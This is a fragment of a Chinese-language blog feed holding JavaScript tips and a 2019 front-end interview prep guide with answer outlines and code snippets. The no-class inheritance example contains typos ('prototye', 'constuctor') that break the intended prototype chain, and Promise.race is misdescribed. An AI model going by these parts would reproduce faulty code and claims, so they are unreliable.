class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let num1 = <span class="string">&quot;15&quot;</span>;</span><br><span class="line">num1 = <span class="symbol">~~num1</span>;</span><br><span class="line">console.<span class="built_in">log</span>(num1); <span class="comment">// Result: 15</span></span><br><span class="line">let num2 = <span class="string">&quot;1.5&quot;</span>;</span><br><span class="line">num2 = <span class="symbol">~~num2</span>;</span><br><span class="line">console.<span class="built_in">log</span>(num2); <span class="comment">// Result: 1</span></span><br></pre></td></tr></table></figure><ul><li><code>|</code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">console</span>.log(<span class="number">23</span>.<span class="number">9</span> | <span class="number">0</span>);  // Result: <span class="number">23</span></span><br><span class="line"><span class="attribute">console</span>.log(-<span class="number">23</span>.<span class="number">9</span> | <span class="number">0</span>); // Result: -<span class="number">23</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="四、数组截断"><a href="#四、数组截断" class="headerlink" title="四、数组截断"></a>四、数组截断</h1><p>如果要从数组的末尾删除值，有比使用 <code>splice()</code> 更快的方法。<br>例如，如果你知道原始数组的大小，您可以重新定义它的length属性，就像这样</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let<span class="built_in"> array </span>= [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];</span><br><span class="line">array.length = 4;</span><br><span class="line">console.log(array); // Result: [0, 1, 2, 3]</span><br></pre></td></tr></table></figure><p>这是一个特别简洁的解决方案。但是，我发现 <code>slice()</code> 方法的运行时更快。如果速度是你的主要目标，考虑使用：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let<span class="built_in"> array </span>= [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];<span class="built_in"></span></span><br><span class="line"><span class="built_in">array </span>= array.slice(0, 4);</span><br><span class="line">console.log(array); // Result: [0, 1, 2, 3]</span><br></pre></td></tr></table></figure><h1 id="五、获取数组中的最后一项"><a href="#五、获取数组中的最后一项" class="headerlink" title="五、获取数组中的最后一项"></a>五、获取数组中的最后一项</h1><p>数组方法 <code>slice()</code> 可以接受负整数，如果提供它，它将接受数组末尾的值，而不是数组开头的值。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let <span class="built_in">array</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">array</span>.<span class="built_in">slice</span>(<span class="number">-1</span>)); <span class="comment">// Result: [9]</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">array</span>.<span class="built_in">slice</span>(<span class="number">-2</span>)); <span class="comment">// Result: [8, 9]</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">array</span>.<span class="built_in">slice</span>(<span class="number">-3</span>)); <span class="comment">// Result: [7, 8, 9]</span></span><br></pre></td></tr></table></figure><h1 id="六、格式化JSON代码"><a href="#六、格式化JSON代码" class="headerlink" title="六、格式化JSON代码"></a>六、格式化JSON代码</h1><p>最后，你之前可能已经使用过 <code>JSON.stringify</code>，但是您是否意识到它还可以帮助你缩进 <code>JSON</code>？<br><code>stringify()</code> 方法有两个可选参数：一个 <code>replacer</code> 函数，可用于过滤显示的 <code>JSON</code> 和一个空格值。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(JSON.stringify(&#123; <span class="attr">alpha</span>: <span class="string">&#x27;A&#x27;</span>, <span class="attr">beta</span>: <span class="string">&#x27;B&#x27;</span> &#125;, <span class="literal">null</span>, <span class="string">&#x27;\t&#x27;</span>));</span><br><span class="line"><span class="comment">// Result:</span></span><br><span class="line"><span class="comment">// &#x27;&#123;</span></span><br><span class="line"><span class="comment">//     &quot;alpha&quot;: A,</span></span><br><span class="line"><span class="comment">//     &quot;beta&quot;: B</span></span><br><span class="line"><span class="comment">// &#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019前端面试押题</title>
      <link href="/Blog/2019/05/21/interview/2019%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/index/"/>
      <url>/Blog/2019/05/21/interview/2019%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/index/</url>
      
        <content type="html"><![CDATA[<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li>『很多』公司面试题都是常年不更新的，『可能』你搜该公司往年的面经，就能猜到今年的题目。</li><li>很多面试官的知识也是常年不更新的，你不要答得太『偏激』，应该了解大众的想法。</li><li>本押题主要强调答题思路，具体答案都可以搜到（不要用百度）</li></ol><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><ol><li>遇到比较抽象的题目就具体化（举例），遇到比较具体的题目就抽象化（阐述）</li><li>抽象题目搜知乎，代码题目搜 Stackoverflow 或博客</li><li>『XXX 的原理』这种题目一般都是说源代码思路，但你不需要看源码，直接看别人的博客即可（再次强调，不要用百度）</li></ol><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><ol><li>必考：你是如何理解 HTML 语义化的？<ol><li>举例法<br>HTML 语义化就是使用正确的标签（总结）段落就写 p 标签，标题就写 h1 标签，文章就写article标签，视频就写video标签，等等。</li><li>阐述法<br>首先讲以前的后台开发人员使用table布局，然后讲美工人员使用div+css布局，最后讲专业的前端会使用正确的标签进行页面开发。</li></ol></li><li>meta viewport 是做什么用的，怎么写？<br>举例法<br><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1&quot;&gt;</code><br>然后逐个解释每个单词的意思。</li><li>你用过哪些 HTML 5 标签？<br>举例法<br>平时如果只用div写页面你就完了，把你平时用到的html5标签列举出来即可，但是要注意如果这个标签的用法比较复杂，你要先看一下MDN的文档再说这个标签；如果你说出一个标签，却不知道它有哪些API，那么你就会被扣分</li><li>H5 是什么？<br>阐述法<br>搜一下知乎就知道了，H5表示移动端页面，反正不是HTML5。</li></ol><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><ol><li><p>必考：两种盒模型分别说一下。<br>先说两种盒模型分别怎么写，具体到代码。然后说你平时喜欢用border box，因为更好用。</p></li><li><p>必考：如何垂直居中？<br>背代码 <a href="https://jscode.me/t/topic/1936" title="null">https://jscode.me/t/topic/1936</a></p></li><li><p>必考：flex 怎么用，常用属性有哪些？<br>看 MDN，背代码。</p></li><li><p>必考：BFC 是什么？<br>背 BFC 触发条件，<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context" title="null">MDN 写了</a>。<br>但是不用全部背下来，面试官只知道其中几个：</p><ol><li>浮动元素（元素的 float 不是 none）</li><li>绝对定位元素（元素的 position 为 absolute 或 fixed）</li><li>行内块元素</li><li>overflow 值不为 visible 的块元素</li><li>弹性元素（display为 flex 或 inline-flex元素的直接子元素）</li></ol></li><li><p>CSS 选择器优先级</p><ol><li>背人云亦云的答案（错答案、已过时）：<a href="https://www.cnblogs.com/xugang/archive/2010/09/24/1833760.html" title="null">https://www.cnblogs.com/xugang/archive/2010/09/24/1833760.html</a></li><li>看面试官脸色行事</li><li>方方给的三句话<ol><li>越具体优先级越高</li><li>同样优先级写在后面的覆盖写在前面的</li><li>!important 优先级最高，但是要少用</li></ol></li></ol></li><li><p>清除浮动说一下<br>背代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">display</span>: block; <span class="comment">/*或者 table*/</span></span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    zoom: <span class="number">1</span>; <span class="comment">/* IE 兼容*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h1 id="原生-JS"><a href="#原生-JS" class="headerlink" title="原生 JS"></a>原生 JS</h1><ol><li><p>必考：ES 6 语法知道哪些，分别怎么用？<br>举例法<br>let const 箭头函数 Promise 展开操作符 默认参数 import export，见<a href="https://fangyinghang.com/es-6-tutorials/" title="null">方方整理的列表</a></p></li><li><p>必考 Promise、Promise.all、Promise.race 分别怎么用？</p><ol><li><p>背代码 Promise 用法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">fn</span>()&#123;</span><br><span class="line">    return new <span class="built_in">Promise</span>((resolve, reject)=&gt;&#123;</span><br><span class="line">        成功时调用 <span class="built_in">resolve</span>(数据)</span><br><span class="line">        失败时调用 <span class="built_in">reject</span>(错误)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">fn</span><span class="params">()</span></span><span class="selector-class">.then</span>(success, fail)<span class="selector-class">.then</span>(success2, fail2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>背代码 Promise.all 用法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Promise<span class="selector-class">.all</span>(<span class="selector-attr">[promise1, promise2]</span>)<span class="selector-class">.then</span>(success1, fail1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>promise1和promise2都成功才会调用success1</p></li><li><p>背代码 Promise.race 用法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Promise<span class="selector-class">.race</span>(<span class="selector-attr">[promise1, promise2]</span>)<span class="selector-class">.then</span>(success1, fail1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>promise1和promise2只要有一个成功就会调用success1</p></li></ol></li><li><p>必考：手写函数防抖和函数节流</p><ol><li><p>背代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 节流（一段时间执行一次之后，就不执行第二次）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, delay</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> canUse = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(canUse)&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            canUse = <span class="literal">false</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>canUse = <span class="literal">true</span>, delay)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> throttled = <span class="title function_">throttle</span>(<span class="function">()=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>))</span><br><span class="line"><span class="title function_">throttled</span>()</span><br><span class="line"><span class="title function_">throttled</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，有些地方认为节流函数不是立刻执行的，而是在冷却时间末尾执行的（相当于施法有吟唱时间），那样说也是对的。</p></li><li><p>背代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防抖（一段时间会等，然后带着一起做了）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, delay</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> timerId = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> context = <span class="variable language_">this</span></span><br><span class="line">        <span class="keyword">if</span>(timerId)&#123;<span class="variable language_">window</span>.<span class="built_in">clearTimeout</span>(timerId)&#125;</span><br><span class="line">        timerId = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(context, <span class="variable language_">arguments</span>)</span><br><span class="line">            timerId = <span class="literal">null</span></span><br><span class="line">        &#125;,delay)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> debounced = <span class="title function_">debounce</span>(<span class="function">()=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>))</span><br><span class="line"><span class="title function_">debounced</span>()</span><br><span class="line"><span class="title function_">debounced</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li><li><p>必考：手写AJAX</p><ol><li><p>背代码，完整版</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var <span class="built_in">request</span> = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line"><span class="built_in">request</span>.open(<span class="comment">&#x27;GET&#x27;, &#x27;/a/b/c?name=ff&#x27;, true);</span></span><br><span class="line"><span class="built_in">request</span>.onreadystatechange = <span class="keyword">function</span> () &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">request</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">request</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">    console.<span class="built_in">log</span>(<span class="built_in">request</span>.responseText);</span><br><span class="line">  &#125;&#125;;</span><br><span class="line"><span class="built_in">request</span>.send();</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>背代码，简化版</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">request.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/a/b/c?name=ff&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">request.onload = <span class="function"><span class="params">()</span>=&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(request.responseText)</span><br><span class="line">request.send()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li><li><p>必考：这段代码里的 this 是什么？</p><ol><li>背代码<ol><li>fn()<br>this &#x3D;&gt; window&#x2F;global</li><li>obj.fn()<br>this &#x3D;&gt; obj</li><li>fn.call(xx)<br>this &#x3D;&gt; xx</li><li>fn.apply(xx)<br>this &#x3D;&gt; xx</li><li>fn.bind(xx)<br>this &#x3D;&gt; xx</li><li>new Fn()<br>this &#x3D;&gt; 新的对象</li><li>fn &#x3D; ()&#x3D;&gt; {}<br>this &#x3D;&gt; 外面的 this</li></ol></li><li>看调用<br><a href="https://zhuanlan.zhihu.com/p/23804247" title="null">《this 的值到底是什么？一次说清楚》</a></li></ol></li><li><p>必考：闭包&#x2F;立即执行函数是什么？</p><ol><li>闭包 <a href="https://zhuanlan.zhihu.com/p/22486908" title="null">https://zhuanlan.zhihu.com/p/22486908</a></li><li>立即执行函数 <a href="https://zhuanlan.zhihu.com/p/22465092" title="null">https://zhuanlan.zhihu.com/p/22465092</a></li></ol></li><li><p>必考：什么是 JSONP，什么是 CORS，什么是跨域？<br>饥人谷系统班全都有讲，没有报名的同学自己搜文章看</p><ol><li>JSONP <a href="https://zhuanlan.zhihu.com/p/22600501" title="null">https://zhuanlan.zhihu.com/p/22600501</a></li><li>CORS <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" title="null">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a></li></ol></li><li><p>常考：async&#x2F;await 怎么用，如何捕获异常？</p><ol><li><a href="http://es6.ruanyifeng.com/?search=async&x=0&y=0#docs/async" title="null">阮一峰的书讲了</a></li><li><a href="https://xiedaimala.com/courses/12a78a03-35f9-42ea-9b37-540540460f6e" title="null">方方的视频课讲了</a> 最后一节。</li></ol></li><li><p>常考：如何实现深拷贝？<br>背代码，要点：</p><ol><li>递归</li><li>判断类型</li><li>检查环（也叫循环引用）</li><li>需要忽略原型</li></ol></li><li><p>常考：如何用正则实现 trim()？<br>背代码</p></li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.<span class="built_in">trim</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> this.<span class="built_in">replace</span>(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//或者 </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trim</span>(<span class="params">string</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="built_in">replace</span>(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="11"><li><p>常考：不用 class 如何实现继承？用 class 又如何实现？</p></li><li><p>背代码，不用 class 这样实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">color</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">move</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125; <span class="comment">// 动物可以动</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">color, name</span>)&#123;</span><br><span class="line">    <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, color) <span class="comment">// 或者 Animal.apply(this, arguments)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 下面三行实现 Dog.prototype.__proto__ = Animal.prototype</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">temp</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">temp.<span class="property">prototye</span> = <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">temp</span>()</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constuctor</span> = <span class="title class_">Dog</span> <span class="comment">// 这行看不懂就算了，面试官也不问</span></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;汪&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;黄色&#x27;</span>,<span class="string">&#x27;阿黄&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>背代码，用 class 就简单了</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    constructor(color)&#123;</span><br><span class="line">        <span class="keyword">this</span>.color = color</span><br><span class="line">    &#125;</span><br><span class="line">    move()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    constructor(color, name)&#123;</span><br><span class="line">        <span class="keyword">super</span>(color)</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">    &#125;</span><br><span class="line">    say()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>常考：如何实现数组去重？</p><ol><li>计数排序变形，背代码</li><li>使用 Set（面试已经禁止这种了，因为太简单）</li><li>使用 WeakMap</li></ol></li><li><p>放弃：&#x3D;&#x3D; 相关题目（反着答）<br>不要背，记不住，太复杂且没有规律</p></li><li><p>送命题：手写一个 Promise<br>提前写一遍，放在博客里，参考 <a href="https://juejin.im/post/5aafe3edf265da238f125c0a" title="null">https://juejin.im/post/5aafe3edf265da238f125c0a</a></p></li></ol><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><ol><li><p>必考：事件委托</p><ol><li><p>错误版（但是可能能过）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ul.add<span class="constructor">EventListener(&#x27;<span class="params">click</span>&#x27;, <span class="params">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.target.tagName.<span class="keyword">to</span><span class="constructor">LowerCase()</span><span class="operator"> === </span>&#x27;li&#x27;)&#123;</span><br><span class="line">        fn<span class="literal">()</span> <span class="comment">// 执行某个函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bug 在于，如果用户点击的是 li 里面的 span，就没法触发 fn，这显然不对。</p></li><li><p>高级版</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">delegate</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span><br><span class="line">    element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</span><br><span class="line">      <span class="keyword">while</span> (!el.matches(selector)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (element === <span class="keyword">el</span>) &#123;</span><br><span class="line">          <span class="keyword">el</span> = null</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> element</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思路是点击 span 后，递归遍历 span 的祖先元素看其中有没有 ul 里面的 li。</p></li></ol></li><li><p>曾考：用 mouse 事件写一个可拖曳的 div<br>参考代码：<a href="https://jsbin.com/munuzureya/edit?html,js,output" title="null">https://jsbin.com/munuzureya/edit?html,js,output</a></p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1></li><li><p>必考：HTTP 状态码知道哪些？分别什么意思？</p><ul><li>2xx 表示成功</li><li>3xx 表示需要进一步操作</li><li>4xx 表示浏览器方面出错</li><li>5xx 表示服务器方面出错</li><li>完整参考 <a href="http://www.runoob.com/http/http-status-codes.html" title="null">http://www.runoob.com/http/http-status-codes.html</a></li></ul></li><li><p>大公司必考：HTTP 缓存有哪几种？</p><ul><li>需要详细的了解 ETag、CacheControl、Expires 的异同</li><li>参考 <a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" title="null">https://imweb.io/topic/5795dcb6fb312541492eda8c</a></li><li>答题要点：<ol><li>ETag 是通过对比浏览器和服务器资源的特征值（如MD5）来决定是否要发送文件内容，如果一样就只发送 304（not modified）</li><li>Expires 是设置过期时间（绝对时间），但是如果用户的本地时间错乱了，可能会有问题</li><li>CacheControl: max-age&#x3D;3600 是设置过期时长（相对时间），跟本地时间无关。</li></ol></li></ul></li><li><p>必考：GET 和 POST 的区别</p><ol><li>错解，但是能过面试<ul><li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li><li>GET产生的URL地址可以被加入收藏栏，而POST不可以。</li><li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li><li>GET请求只能进行url编码，而POST支持多种编码方式。</li><li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li><li>GET请求在URL中传送的参数是有长度限制的，而POST么有。</li><li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li><li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li><li>GET参数通过URL传递，POST放在Request body中。</li></ul></li><li>正解<br>就一个区别：语义——GET 用于获取资源，POST 用于提交资源。</li><li>想装逼请参考 <a href="https://zhuanlan.zhihu.com/p/22536382" title="null">https://zhuanlan.zhihu.com/p/22536382</a></li></ol></li><li><p>Cookie V.S. LocalStorage V.S. SessionStorage V.S. Session</p><ul><li>Cookie V.S. LocalStorage<ol><li>主要区别是 Cookie 会被发送到服务器，而 LocalStorage 不会</li><li>Cookie 一般最大 4k，LocalStorage 可以用 5Mb 甚至 10Mb（各浏览器不同）</li></ol></li><li>LocalStorage V.S. SessionStorage<ol><li>LocalStorage 一般不会自动过期（除非用户手动清除），而 SessionStorage 在回话结束时过期（如关闭浏览器）</li></ol></li><li>Cookie V.S. Session<ol><li>Cookie 存在浏览器的文件里，Session 存在服务器的文件里</li><li>Session 是基于 Cookie 实现的，具体做法就是把 SessionID 存在 Cookie 里</li></ol></li></ul></li></ol><h1 id="框架-Vue"><a href="#框架-Vue" class="headerlink" title="框架 Vue"></a>框架 Vue</h1><ol><li><p>必考：watch 和 computed 和 methods 区别是什么？</p><ol><li>思路：先翻译单词，再阐述作用，最后强行找不同。</li><li>要点：<ol><li>computed 和 methods 相比，最大区别是 computed 有缓存：如果 computed 属性依赖的属性没有变化，那么 computed 属性就不会重新计算。methods 则是看到一次计算一次。</li><li>watch 和 computed 相比，computed 是计算出一个属性（废话），而 watch 则可能是做别的事情（如上报数据）</li></ol></li></ol></li><li><p>必考：Vue 有哪些生命周期钩子函数？分别有什么用？</p><ol><li>钩子在<a 